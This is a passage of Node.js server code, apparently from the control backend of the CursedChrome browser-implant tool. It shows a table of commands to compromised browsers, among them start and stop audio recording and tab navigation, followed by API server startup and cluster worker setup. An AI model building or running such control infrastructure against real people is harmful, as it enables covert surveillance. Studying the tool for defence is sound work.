    stop_tab_navigate: stop_tab_navigate,
    start_audio_recording: start_audio_recording,
    stop_audio_recording: stop_audio_recording,
    notify_system_event: (type, data = {}) => {
      publisher.publish("SYSTEM_EVENTS", JSON.stringify({ type, ...data }));
    },
  };

  // Start the API server
  const api_server = await get_api_server(proxy_utils);
  api_server.listen(API_SERVER_PORT, () => {
    logit(
      `CursedChrome API server is now listening on port ${API_SERVER_PORT}`
    );
  });
}

(async () => {
  // If we're the master process spin up workers
  // If we're the worker processes, get to work!
  if (cluster.isMaster) {
    logit(`Master ${process.pid} is running`);

    logit(`Initializing the database connection...`);
    await database_init();
    logit(`Database initialize finished...`);
    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
      cluster.fork();
    }

    cluster.on("exit", (worker, code, signal) => {
      logit(`worker ${worker.process.pid} died`);
    });
  } else {
    // Start worker
    initialize();
    logit(`Worker ${process.pid} started`);
  }
})();
